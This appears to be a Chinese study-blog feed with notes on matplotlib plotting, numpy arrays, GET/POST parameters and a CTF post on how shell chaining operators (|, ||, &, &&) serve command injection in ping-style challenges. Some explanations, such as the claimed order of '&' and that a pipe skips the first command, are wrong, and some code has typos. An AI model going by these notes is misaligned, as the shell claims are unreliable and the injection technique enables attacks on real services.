class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置底层图片的大小"><a href="#设置底层图片的大小" class="headerlink" title="设置底层图片的大小"></a>设置底层图片的大小</h2><ol><li>figsize()函数设置散点图是几×几大小的</li><li>dpi设置分辨率(像素)<h3 id="像素的定义："><a href="#像素的定义：" class="headerlink" title="像素的定义："></a>像素的定义：</h3></li><li>在由一个数字序列表示的图像中的一个最小单位</li><li>当像素点的大小一定时，像素点约多，照片越大<h2 id="改变线条的颜色和粗细"><a href="#改变线条的颜色和粗细" class="headerlink" title="改变线条的颜色和粗细"></a>改变线条的颜色和粗细</h2></li><li>plot()函数</li><li>color参数设置颜色</li><li>linewidth参数设置线条粗细</li><li>linestyle参数设置线条风格</li></ol><h3 id="plot函数详解："><a href="#plot函数详解：" class="headerlink" title="plot函数详解："></a>plot函数详解：</h3><ol><li>plt.plot(x,y,linestyle=’-‘,linewidth=’x’,label=’xxx’,color=’xxx’)</li><li>x:x轴上的值</li><li>y:y轴上的值</li><li>linestyle:线条风格</li><li>linewidth:线条粗细</li><li>label:标签文本</li></ol><h4 id="plot函数常见问题："><a href="#plot函数常见问题：" class="headerlink" title="plot函数常见问题："></a>plot函数常见问题：</h4><pre class="line-numbers language-none"><code class="language-none">x and y must have same first dimensition,but have shapes (4,) and (6,)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>意为：x和y必须参数的个数相同（个数不相同，有的只有一个坐标你怎么画点呢？）<br><a href="https://imgtu.com/i/Lg0l1U"><img src="https://s1.ax1x.com/2022/04/22/Lg0l1U.md.png" alt="Lg0l1U.md.png"></a></li><li>ing</li></ol><h3 id="linestyle参数"><a href="#linestyle参数" class="headerlink" title="linestyle参数"></a>linestyle参数</h3><pre class="line-numbers language-none"><code class="language-none">&#39;-&#39;, &#39;--&#39;, &#39;-.&#39;, &#39;:&#39;, &#39;None&#39;, &#39; &#39;, &#39;&#39;, &#39;solid&#39;, &#39;dashed&#39;, &#39;dashdot&#39;, &#39;dotted&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="设置图片边界"><a href="#设置图片边界" class="headerlink" title="设置图片边界"></a>设置图片边界</h2><h2 id="设置记号"><a href="#设置记号" class="headerlink" title="设置记号"></a>设置记号</h2><ol><li>r表示不需要转义,raw(生的)，LATEX用法，python中使用latex,需要在文本的后面加上$,\pi会转义为pi<pre class="line-numbers language-none"><code class="language-none">xticks(lis,[r&#39;$-\pi$&#39;,r&#39;$-\pi&#x2F;2$&#39;,r&#39;$0$&#39;,r&#39;$-\pi$&#39;,r&#39;$-\pi$&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>后面数组中的每一个元素都与前面元素一一对应</li></ol><h2 id="设置轴："><a href="#设置轴：" class="headerlink" title="设置轴："></a>设置轴：</h2><ol><li>matplotlib的图中，默认有四个轴，两个横轴和两个竖轴，通过ax.plt.gca()方法获取，gca是get current axes的缩写（axes是轴的意思）</li><li>总共有四个轴：top,bottom,left,right<h3 id="由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示"><a href="#由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示" class="headerlink" title="由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示"></a>由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示</h3><pre class="line-numbers language-none"><code class="language-none">ax.spines[&#39;right&#39;].set_color(&#39;none&#39;)ax.spines[&#39;top&#39;].set_color(&#39;none&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>将会看见top和right边被隐藏<h3 id="移动下面和左边的轴到指定的位置"><a href="#移动下面和左边的轴到指定的位置" class="headerlink" title="移动下面和左边的轴到指定的位置"></a>移动下面和左边的轴到指定的位置</h3><h4 id="具体函数-ax-spines-‘四个轴的位置’-set-position-‘值的类型’，具体值"><a href="#具体函数-ax-spines-‘四个轴的位置’-set-position-‘值的类型’，具体值" class="headerlink" title="具体函数:ax.spines[‘四个轴的位置’].set_position(‘值的类型’，具体值)"></a>具体函数:ax.spines[‘四个轴的位置’].set_position(‘值的类型’，具体值)</h4><pre class="line-numbers language-none"><code class="language-none">一定一定要注意，spines后面是[]而非(),set_position後面是()我對此的理解為：[]表示选择，ax在gca()时已经初始化了，[]是在top,bottom,left和right中的选择；()表示需补充参数，参数未经过初始化区分选择和补充的含义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="以下是set-position中各种值的类型"><a href="#以下是set-position中各种值的类型" class="headerlink" title="以下是set_position中各种值的类型"></a>以下是set_position中各种值的类型</h4></li><li>data:移动轴的位置到交叉轴的指定坐标</li><li>outward:不太懂</li><li>axes:0.0~1.0之间的值，整个轴上的比例</li><li>center:(‘axes’,0.5)</li><li>zero:(‘data’,0.0)<pre class="line-numbers language-none"><code class="language-none">ax.spines[&#39;bottom&#39;].set_position((&#39;data&#39;,0))ax.spines[&#39;left&#39;].set_position((&#39;data&#39;,0))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><a href="https://imgtu.com/i/LrlVm9"><img src="https://s1.ax1x.com/2022/04/20/LrlVm9.png" alt="LrlVm9.png"></a><br><a href="https://imgtu.com/i/LrlZwR"><img src="https://s1.ax1x.com/2022/04/20/LrlZwR.png" alt="LrlZwR.png"></a></li><li>由上图可看出，这个轴其实不是坐标轴，而是图形的边界</li><li>我认为：top和right的轴是图形的边界，不能够改变坐标轴</li><li>而left和bottom可以改变坐标轴的位置，参数如上图所示</li></ol><h2 id="添加图例："><a href="#添加图例：" class="headerlink" title="添加图例："></a>添加图例：</h2><ol><li>在plot函数中以[键-值] 的形式增加一个参数<pre class="line-numbers language-none"><code class="language-none">plot(X,S,color&#x3D;&quot;blue&quot;,linewidth&#x3D;2.5,linestyle&#x3D;&quot;-&quot;,lable&#x3D;&quot;图例名称&quot;)legend(loc&#x3D;&quot;位置&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>legend位置参数：upper,bottom,left,right<h3 id="常用legend函数参数："><a href="#常用legend函数参数：" class="headerlink" title="常用legend函数参数："></a>常用legend函数参数：</h3></li><li>loc:图例位置</li><li>fontsize:字体大小</li><li>edgecolor: frame edgecolor</li><li>facecolor: frame facecolor</li></ol><h2 id="特殊点添加注释：函数scatter-意为分散的点"><a href="#特殊点添加注释：函数scatter-意为分散的点" class="headerlink" title="特殊点添加注释：函数scatter(意为分散的点)"></a>特殊点添加注释：函数scatter(意为分散的点)</h2><ol><li>前提：x，y轴包括数值以及大小和颜色</li><li><a href="https://www.jb51.net/article/127806.htm">https://www.jb51.net/article/127806.htm</a><pre class="line-numbers language-none"><code class="language-none">scatter([t,],[np.cos(t),],50,color&#x3D;&#39;blue&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>scatter(x,y,[size],[color],[marker])<h3 id="scatter参数详解："><a href="#scatter参数详解：" class="headerlink" title="scatter参数详解："></a>scatter参数详解：</h3></li><li>x,y:形如shape[n,]不全的数组，即添加注释点的位置</li><li>size:直接给出点的大小，标量或者形如shape[n,]的数组</li><li>color:色彩或颜色序列</li><li>marker:markstyle,可选，默认’o’<br><img src="https://img.jbzj.com/file_images/article/201711/201711081604306.jpg" alt="marker"></li></ol><h3 id="annotate参数详解"><a href="#annotate参数详解" class="headerlink" title="annotate参数详解"></a>annotate参数详解</h3><pre class="line-numbers language-none"><code class="language-none">annotate(s,xy,xytext&#x3D;None,xycoords&#x3D;&#39;data&#39;,textcoords&#x3D;None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>s:被注释内容</li><li>xy:被注释的坐标点，二维元组形如[x,y]</li><li>xytext:注释文本的坐标点，也是二维元组，默认与xy相同</li><li>xycoords:被注释点的坐标系属性</li><li>textcoords设置注释文本的坐标系属性<pre class="line-numbers language-none"><code class="language-none">annotate(r&#39;$sin(\frac&#123;2\pi&#125;&#123;3&#125;)&#39;&#x3D;\frac&#123;\sqrt&#123;3&#125;&#125;&#123;2&#125;$&#39;,xy&#x3D;(t,np.sin(t)),xycoords&#x3D;&#39;data&#39;,xytext&#x3D;(+10,+30),textcoords&#x3D;&#39;offset points&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="看过李师哥的备课后的补充"><a href="#看过李师哥的备课后的补充" class="headerlink" title="看过李师哥的备课后的补充"></a>看过李师哥的备课后的补充</h1><h2 id="构建画框的骨架的两种方法："><a href="#构建画框的骨架的两种方法：" class="headerlink" title="构建画框的骨架的两种方法："></a>构建画框的骨架的两种方法：</h2><pre class="line-numbers language-none"><code class="language-none">fig &#x3D; plt.figure()ax &#x3D; fig.add_axes([0.1,0.1,0.8,0.8])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>和<pre class="line-numbers language-none"><code class="language-none">fig &#x3D; plt.figure()ax &#x3D; gca()&#x2F;&#x2F;初始化四个轴left &#x3D; bottom &#x3D; 0.1right &#x3D; top &#x3D; 0.8ls &#x3D; [left,bottom,right,top]for i in ls:ax.spines[top].set_position(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="子图的划分"><a href="#子图的划分" class="headerlink" title="子图的划分"></a>子图的划分</h2><ol><li>如果两个图片的x轴的范围不同的情况下，放在同一张画布下是不易显示的<h3 id="格式一"><a href="#格式一" class="headerlink" title="格式一"></a>格式一</h3><pre class="line-numbers language-none"><code class="language-none">figure &#x3D; plt.figure()plt.subplot(nrows,ncols,plot_number)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>其中nrows表示要划分的行数</li><li>ncols表示要划分的列数</li><li>plot_number表示当前的子图区<pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; []y &#x3D; []figure &#x3D; figure((m，n)，dpi)&#x2F;&#x2F;创建一个m*n点的图像axes1 &#x3D; figure.add_subplot(2,1,1)&#x2F;&#x2F;划分为两行，将第一行作为当前需要描绘的子图区plot(x,y)x &#x3D; []y &#x3D; []axes2 &#x3D; figure.add_subplot(2,1,2)&#x2F;&#x2F;选取第二块子图区plot(x,y)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="plt-rcParams属性总结"><a href="#plt-rcParams属性总结" class="headerlink" title="plt.rcParams属性总结"></a>plt.rcParams属性总结</h2><ol><li>plt使用rc配置文件；来自定义图形的各种观点默认属性，称之为rc配置或rc参数，通过rc参数可以修改默认的属性，包括窗体大小，每英寸的点数，线条宽度，颜色，样式，坐标轴坐标，网络属性，文本，字体</li><li>plt.rcParams[‘font.sans-serif’] = ‘SimHei’设置字体</li><li>plt.rcParams[‘axes.unicode_minus’] = False字符显示：减号使用unicode编码而不是连字符号</li></ol><h3 id="设置中文字体："><a href="#设置中文字体：" class="headerlink" title="设置中文字体："></a>设置中文字体：</h3><ol><li>plt.rcParams[‘font.san-serif’]=[‘SimHei’]：SimHei是设置字体为黑体</li><li>plt.rcParams[‘axes.unicode_minus’] = False设置字符显示</li><li>这个地方的unicode_minus我的理解为减去unicode即为不使用Unicode编码</li><li>如果设置为false，则负负得正，使用Unicode编码<h3 id="获取用户配置路径"><a href="#获取用户配置路径" class="headerlink" title="获取用户配置路径"></a>获取用户配置路径</h3><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.get_gonfigdir()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="获取用户当前使用配置文件的路径"><a href="#获取用户当前使用配置文件的路径" class="headerlink" title="获取用户当前使用配置文件的路径"></a>获取用户当前使用配置文件的路径</h3><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.matplotlib_fname()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="查看rc参数的方法与rc参数的使用"><a href="#查看rc参数的方法与rc参数的使用" class="headerlink" title="查看rc参数的方法与rc参数的使用"></a>查看rc参数的方法与rc参数的使用</h3><ol><li><p>查看：</p><pre class="line-numbers language-none"><code class="language-none">import matplotlib as mplprint(mpl.rcParams)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>修改：(用中括号去取下标)</p><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.rcParams[&#39;具体参数名称&#39;] &#x3D; xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>通过matplotlib.rc一次设置多个参数</p><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.rc(&#39;lines&#39;,linewidth&#x3D;2,color&#x3D;&#39;red&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>rc参数说明：</p><pre class="line-numbers language-none"><code class="language-none">lines.linewidth:线宽lines.linestyle:线的风格lines.color:线的颜色lines.marker:None 默认标记lines.markersize:标记大小lines.antialiased:True 使用抗锯齿渲染：没有缺口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="rc参数字体属性："><a href="#rc参数字体属性：" class="headerlink" title="rc参数字体属性："></a>rc参数字体属性：</h4></li><li><p>font.family</p></li><li><p>font.style:normal(roman),italic,oblique</p></li><li><p>font.variant:normal,small-caps</p></li><li><p>font.weight:normal,bold,bolder,lighter,100,200,300…900</p></li><li><p>font.stretch</p></li><li><p>font.size:默认字体大小，以磅为单位</p></li><li><p>网格：</p><pre class="line-numbers language-none"><code class="language-none">grid.color:网格颜色grid.linestyle:点grid.linewidth:pt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="具体参数详见博客地址"><a href="#具体参数详见博客地址" class="headerlink" title="具体参数详见博客地址"></a>具体参数详见博客地址</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;shuaishuaidefeizhu&#x2F;p&#x2F;14035247.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>引入matpoltlib库</li><li>创建一个图作为背景figure</li><li>x轴坐标，y轴坐标</li><li>plot绘制曲线</li><li>设置横轴上下限xlim</li><li>设置横轴记号和纵轴记号</li><li>保存图片savefig</li><li>在屏幕上显示show</li></ol><h1 id="正弦函数图像"><a href="#正弦函数图像" class="headerlink" title="正弦函数图像"></a>正弦函数图像</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *figure(figsize&#x3D;(8,6),dpi&#x3D;80)x &#x3D; np.linspace(-np.pi,np.pi,256,endpoint&#x3D;True)y &#x3D; np.sin(x)plot(x,y,color&#x3D;&#39;blue&#39;,linewidth&#x3D;&#39;10&#39;,linestyle&#x3D;&#39;-&#39;)xlim(-4.0,4.0)ylim(-1.0,1.0)xticks(np.linspace(-4,4,9,endpoint&#x3D;True))yticks(np.linspace(-1.0,1.0,3,endpoint&#x3D;True))ax &#x3D; gca()ax.spines[&#39;right&#39;].set_color(&#39;None&#39;)ax.spines[&#39;top&#39;].set_color(&#39;None&#39;)ax.spines[&#39;bottom&#39;].set_position((&#39;axes&#39;,0.5))ax.spines[&#39;left&#39;].set_position((&#39;axes&#39;,0.5))show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二次曲线图像"><a href="#二次曲线图像" class="headerlink" title="二次曲线图像"></a>二次曲线图像</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *from numpy import *x &#x3D; np.linspace(-1,1,66,endpoint&#x3D;True)y &#x3D; x**2plot(x,y,linestyle&#x3D;&#39;-&#39;,lw&#x3D;&#39;10&#39;,color&#x3D;&#39;blue&#39;)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="正余弦函数图像"><a href="#正余弦函数图像" class="headerlink" title="正余弦函数图像"></a>正余弦函数图像</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *fig &#x3D; figure(figsize&#x3D;(8,6),dpi&#x3D;80)#dpi参数是分辨率fig.add_axes([0.1,0.1,0.8,0.8])subplot(1,1,1)#创建一个1*1子图，接下来图样的绘制在第一块x &#x3D; np.linspace(-np.pi,np.pi,256,endpoint&#x3D;True)c,s &#x3D; np.cos(x),np.sin(x)plot(x,c,color&#x3D;&quot;blue&quot;,linewidth&#x3D;1.0,linestyle&#x3D;&quot;solid&quot;,label&#x3D;&quot;cosine&quot;)plot(x,s,color&#x3D;&quot;green&quot;,linewidth&#x3D;1.0,linestyle&#x3D;&quot;dotted&quot;,label&#x3D;&quot;sine&quot;)legend(loc&#x3D;&#39;upper left&#39;,fontsize&#x3D;&quot;18&quot;)xlim(-4.0,4.0)lis &#x3D; ([-np.pi,-np.pi&#x2F;2.0,0,np.pi&#x2F;2.0,np.pi])#xticks(np.linspace(-4,4,9,endpoint&#x3D;True))ylim(-1.0,1.0)#yticks(np.linspace(-4,4,9,endpoint&#x3D;True))#xticks(lis)xticks(lis,[r&#39;$-\pi$&#39;,r&#39;$-\pi&#x2F;2$&#39;,r&#39;$0$&#39;,r&#39;$-\pi$&#39;,r&#39;$-\pi$&#39;])#r表示不需要转义,raw(生的)，LATEX用法，python中使用latex,需要在文本的后面加上$,\pi会转义为piyticks(lis)ax &#x3D; gca()ax.spines[&#39;right&#39;].set_color(&#39;none&#39;)ax.spines[&#39;top&#39;].set_color(&#39;none&#39;)ax.spines[&#39;bottom&#39;].set_position((&#39;axes&#39;,0.5))ax.spines[&#39;left&#39;].set_position((&#39;axes&#39;,0.5))t &#x3D; 2*np.pi&#x2F;3plot([t,t],[0,np.cos(t)],color&#x3D;&#39;blue&#39;,linewidth&#x3D;2.5,linestyle&#x3D;&#39;--&#39;)scatter([t,],[np.cos(t),],50,color&#x3D;&#39;blue&#39;)t &#x3D; 2*np.pi&#x2F;3plot([t,t],[0,np.cos(t)], color &#x3D;&#39;blue&#39;, linewidth&#x3D;2.5, linestyle&#x3D;&quot;--&quot;)scatter([t,],[np.cos(t),], 50, color &#x3D;&#39;blue&#39;)annotate(r&#39;$\sin(\frac&#123;2\pi&#125;&#123;3&#125;)&#x3D;\frac&#123;\sqrt&#123;3&#125;&#125;&#123;2&#125;$&#39;,         xy&#x3D;(t, np.sin(t)), xycoords&#x3D;&#39;data&#39;,         xytext&#x3D;(+10, +30), textcoords&#x3D;&#39;offset points&#39;, fontsize&#x3D;16,         arrowprops&#x3D;dict(arrowstyle&#x3D;&quot;-&gt;&quot;, connectionstyle&#x3D;&quot;arc3,rad&#x3D;.2&quot;))plot([t,t],[0,np.sin(t)], color &#x3D;&#39;red&#39;, linewidth&#x3D;2.5, linestyle&#x3D;&quot;--&quot;)scatter([t,],[np.sin(t),], 50, color &#x3D;&#39;red&#39;)annotate(r&#39;$\cos(\frac&#123;2\pi&#125;&#123;3&#125;)&#x3D;-\frac&#123;1&#125;&#123;2&#125;$&#39;,         xy&#x3D;(t, np.cos(t)), xycoords&#x3D;&#39;data&#39;,         xytext&#x3D;(-90, -50), textcoords&#x3D;&#39;offset points&#39;, fontsize&#x3D;16,         arrowprops&#x3D;dict(arrowstyle&#x3D;&quot;-&gt;&quot;, connectionstyle&#x3D;&quot;arc3,rad&#x3D;.2&quot;))show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条"><a href="#将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条" class="headerlink" title="将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条"></a>将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; [1,2,3,4,5,6]y &#x3D; [3,5,7,1,9,12]figure &#x3D; figure(figsize&#x3D;(8,6),dpi &#x3D; 80)axes1 &#x3D; figure.add_subplot(2,3,1)axes2 &#x3D; figure.add_subplot(2,3,2)axes3 &#x3D; figure.add_subplot(2,3,3)axes4 &#x3D; figure.add_subplot(2,3,4)axes5 &#x3D; figure.add_subplot(2,3,5)axes6 &#x3D; figure.add_subplot(2,3,6)axes1.plot(x,y,&#39;ro&#39;)axes2.plot(x,y,&#39;r-*&#39;)axes3.plot(x,y,&#39;bs&#39;)axes4.plot(x,y,&#39;^g-.&#39;)axes5.plot(x,y,&#39;m8&#39;)axes6.plot(x,y,&#39;yd:&#39;)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>plot中的线条的线性，标记的符号和线条的颜色参数的前后位置没有要求</li></ol><h1 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h1><h2 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h2><ol><li>在条形图中可以非常直观地通过位置比较比较数值大小，因为在条形图中条的高度就是数值，所以一眼就可以看出数值的高度<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre class="line-numbers language-none"><code class="language-none">bar(x,height,width,bottom)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3></li><li>(x,height)定义在什么位置上，多高的bar（这个地方的高度其实是条形图的宽度，因为是躺着的，所以叫高度）</li><li>width定义bar的宽度（这个地方的宽度是条形图的高度，因为是躺着的，座椅叫做宽度）</li><li>bottom定义bar的实际高度（我的理解是bar的实际底在哪里）<h4 id="默认参数："><a href="#默认参数：" class="headerlink" title="默认参数："></a>默认参数：</h4></li><li>height：柱子的高度，y轴上的坐标</li><li>width：柱子的宽度，默认值是0.8</li><li>bottom：柱子的基准高度，浮点数或者类数组结构，默认值为0</li><li>bar orientation:给定的是一个向量，该向量指定单元局部坐标系的纵轴方向<h3 id="条形图实例"><a href="#条形图实例" class="headerlink" title="条形图实例"></a>条形图实例</h3><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; [1,2,3,4,5,6]y &#x3D; [2,3,54,6,7,4]figure &#x3D; figure(figsize&#x3D;(8,6),dpi &#x3D; 80)bar(x,y)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="横向条形图实例"><a href="#横向条形图实例" class="headerlink" title="横向条形图实例"></a>横向条形图实例</h3><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; [1,2,3,4,5,6]y &#x3D; [3,5,1,7,9,12]#x指定其实位置从0开始，bottom指定水平条其实位置为左侧，height指定绘图的水平条的宽度，width指定绘制的水平条的长度，orientation指定要绘制的是水平条，color指定颜色bar(x&#x3D;0,bottom&#x3D;y,height&#x3D;0.3,width&#x3D;x,orientation&#x3D;&#39;horizontal&#39;,color&#x3D;&#39;red&#39;)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注意重叠问题："><a href="#注意重叠问题：" class="headerlink" title="注意重叠问题："></a>注意重叠问题：</h3></li><li>在绘制多组条形图进行对比时需要注意一点，bar_width的范围是(0,1)没错，但是多组图表需要保证几组图表的范围之和不超过1（范围之和！和！！和！！！）<br>```</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据可视化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python中numpy数组</title>
      <link href="/python%E4%B8%AD%E7%9A%84numpy%E6%95%B0%E7%BB%84/"/>
      <url>/python%E4%B8%AD%E7%9A%84numpy%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy数组"><a href="#numpy数组" class="headerlink" title="numpy数组"></a>numpy数组</h1><ol><li>numpy用于处理数组，对象称为ndarray</li><li>可以用array()函数创建一个numpy ndarray对象<pre class="line-numbers language-none"><code class="language-none">arr &#x3D; np array([1,2,3,4,5])print(arr)print(type(arr))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="numpy和list的区别："><a href="#numpy和list的区别：" class="headerlink" title="numpy和list的区别："></a>numpy和list的区别：</h1></li><li>内存大小–numpy数据结构占用的内存空间更小</li><li>性能–numpy底层是用c写的，比列表更快</li><li>运算方法–内置优化了代数运算等方法</li></ol><h1 id="np-linspace函数"><a href="#np-linspace函数" class="headerlink" title="np.linspace函数"></a>np.linspace函数</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; np.linspace(-np.pi,np.pi,256,endpoint &#x3D; True)c,s &#x3D; np.cos(x),np.sin(x)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>linspace函数：指定的间隔内返回均匀间隔的数字</li><li>endpoint：bool类型，如果为true则包含stop,否则不包含stop(结尾点)<h2 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h2></li><li>start:序列的起始点</li><li>end:序列的终止点，如果endpoint设置为true,则包含最后一个点（全闭区间）</li><li>num:生成的样本数，默认是50，必须为非负</li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 数据可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据可视化 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于command类题型，ping和waf</title>
      <link href="/%E5%85%B3%E4%BA%8Ecommandping%E5%92%8Cwaf/"/>
      <url>/%E5%85%B3%E4%BA%8Ecommandping%E5%92%8Cwaf/</url>
      
        <content type="html"><![CDATA[<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><ol><li>ping是windows,unix,linux系统下的一个命令，ping也属于一个通信协议，是TCP/IP协议的一部分。</li><li>利用ping命令可以检查网络是否联通，可以很好地帮助我们分析和判断网络故障。</li><li>格式:ping空格IP地址</li></ol><h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><ol><li>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）</li><li>waf具备限制对某些url请求次数的能力和限制文件上传功能的能力</li><li><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2></li><li>|的作用是将前一个命令的执行结果传递给后一个命令作为输入</li><li>&amp;&amp;的作用是将当前一条命令执行成功时才执行后一条命令</li></ol><h3 id="windows-或-linux-下"><a href="#windows-或-linux-下" class="headerlink" title="windows 或 linux 下:"></a>windows 或 linux 下:</h3><h4 id="amp-amp-amp-被称为管道符"><a href="#amp-amp-amp-被称为管道符" class="headerlink" title="| || &amp; &amp;&amp;被称为管道符"></a>| || &amp; &amp;&amp;被称为管道符</h4><ol><li>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</li><li>command1 | command2 只执行 command2（将command1的结果给command2），但是不去执行command1</li><li>command1 &amp; command2 先执行 command2 后执行 command1，注意先后顺序！！！</li><li>command1 || command2 先执行 command1，如果为假，再执行 command2</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ping </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get传参和post传参</title>
      <link href="/get%E4%BC%A0%E5%8F%82%E5%92%8Cpost%E4%BC%A0%E5%8F%82/"/>
      <url>/get%E4%BC%A0%E5%8F%82%E5%92%8Cpost%E4%BC%A0%E5%8F%82/</url>
      
        <content type="html"><![CDATA[<h1 id="get传参："><a href="#get传参：" class="headerlink" title="get传参："></a>get传参：</h1><ol><li>在URL（统一资源定位器）后面’?id=xxx’</li></ol><h1 id="post传参："><a href="#post传参：" class="headerlink" title="post传参："></a>post传参：</h1><ol><li>使用hackbar</li><li>填入url后选择post data</li><li><img src="https://img-blog.csdnimg.cn/689b3739d1d0453591a7e31f24fc1576.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAN1NTbG9uZw==,size_20,color_FFFFFF,t_70,g_se,x_16"></li><li>填入post data的数据</li><li>execution</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站备份文件后缀</title>
